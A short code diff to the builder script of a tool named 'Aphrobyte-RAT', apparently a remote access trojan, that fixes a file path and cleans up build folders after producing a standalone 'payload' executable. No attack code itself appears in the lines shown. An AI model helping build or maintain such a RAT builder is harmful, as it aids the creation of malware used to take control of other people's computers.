@@ -108,8 +108,11 @@ print("")
 print(colored("""
 Your payload has been successfully created. It has been named to "Client-built.exe" and can be used as a standalone.
 """, 'green'))
-shutil.copy("dist\Client-built.exe", "Client-built.exe")
+shutil.copy("dist\\Client-built.exe", "Client-built.exe")
 os.remove(".buildmodules\main.py")
+shutil.rmtree("dist")
+shutil.rmtree("build")
+os.remove("Client-built.spec")
 os.system("""title "Aphrobyte-RAT Builder | Built | Unlicensed"
 """)
 pause()
